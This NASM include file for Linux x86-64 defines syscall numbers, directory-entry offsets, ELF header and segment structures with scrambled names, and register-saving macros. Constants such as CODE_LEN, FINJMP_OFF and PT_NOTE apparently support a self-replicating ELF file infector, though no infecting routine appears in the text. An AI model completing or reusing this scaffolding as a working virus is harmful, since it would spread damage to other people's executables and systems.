; SYSCALL
%define     SYS_OPEN        2
%define     SYS_CLOSE       3
%define  SYS_LSEEK  8
%define  SYS_MMAP  9
%define  SYS_UNMAP  11
%define     SYS_EXIT        60
%define  SYS_FTRUNCATE 77
%define     SYS_GETDENTS    217

; OPEN
%define  O_RDONLY   0x0000
%define  O_WRONLY   0x0001
%define  O_RDWR    0x0002
%define  O_DIRECTORY   0q0200000

; DIRENT
%define  D_INO_OFF   0x00
%define  D_OFF_OFF   0x08
%define  D_RECLEN_OFF  0x10
%define  D_TYPE     0x12
%define  D_NAME     0x13
%define     D_REG_FILE          0x8

; MMAP
%define  PROT_EXEC  1
%define  PROT_READ  2
%define  PROT_WRITE  4
%define  MAP_SHARED  1

; LSEEK
%define  SEEK_SET   0x0
%define  SEEK_END   0x2

%define  FAM(x)    [(rbp - EjCzV7zWv_size) + x]
%define  INF(x)    [(rbp - sdo0BysL8f_size) + x]


%define  CODE_LEN  (gLj4boEu - _start)
%define  FINJMP_OFF  (vESv6z - _start)
%define  PAGE_SIZE  0x1000


struc EjCzV7zWv
.pa98hvWY             resq    1
.SJTK2          resq    1
.QpxZLmj                 resq    1
.W25WTT:           resb    PAGE_SIZE
.RwFtnZJB:        resd    1
.f1d0FF:     resd    1
.zvSUIpXjJ resq    1
.rRcDlhMrQ resq 1
endstruc

struc sdo0BysL8f
.q7UhD3H7S   resq 1
.PEi4ySPjb2   resq 1
.rRcDlhMrQ   resq 1
.CxsCJPQD    resb 1
.URL1aZ  resq 1
.r27Xqje resq 1
.kmMNfSQg resq 1
.gzUNX  resq 1
.WJ3l4MziY  resq 1 
.ZF0R4vA  resq 1
.UKgLYq3  resq 1
.gCa451   resb 1
.jbuURm   resq 1
.uIqfv  resq 1
.uz4bjvMW0  resq 1
endstruc

; ELF structures
%define PT_LOAD  0x1
%define PT_NOTE  0x4
%define PF_X  0x1
%define PF_R  0x4
%define SHT_PROGBITS 0x1
%define SHT_STRTAB 0x3
%define SHT_NOTE 0x7
%define SHT_RELA 0x4
%define SHF_ALLOC 0x2
%define SHF_EXECINSTR 0x4

struc pRBkUrO5
.iiEYNm6B:  resb 16
.Q3TUyKy:  resw 1
.cGlFDep:  resw 1
.i3RtkL:  resd 1
.jPUACXO4wu:  resq 1
.PpDoFWp:  resq 1
.GcnemzIA:  resq 1
.RW4XC:  resd 1
.G5tg0WG:  resw 1
.EfUtwjonZ: resw 1
.Df0PttR7O:  resw 1
.JUgG3Q: resw 1
.o64cTvXn:  resw 1
.k6oBVH: resw 1
endstruc

struc KlRU8
.xXBiSq:  resd 1
.Gpf3h00m3:  resd 1
.KY1FY:  resq 1
.hMiLM8:  resq 1
.eaXpnLdaO7:  resq 1
.zIxMP2:  resq 1
.SZmjGzMVKM:  resq 1
.unJFClezF:  resq 1
endstruc

struc i1swc
.QrFgJ:  resd 1
.bJMwnS:  resd 1
.gkrCtNMOvY:  resq 1
.SUJg152kSB:  resq 1
.LZZBS2jcgT:  resq 1
.ewzLE:  resq 1
.IFTJkFiQW:  resd 1
.lRMl9V:  resd 1
.KVG8EcI90 resq 1
.v0dtZ  resq 1
endstruc

struc ZeWhXHc2
.qeFhnkkY  resq 1
.Ve93gvw   resq 1
.Pt2cBmMRz  resq 1
endstruc

%macro PUSHA 0
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
%endmacro

%macro POPA 0
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
%endmacro 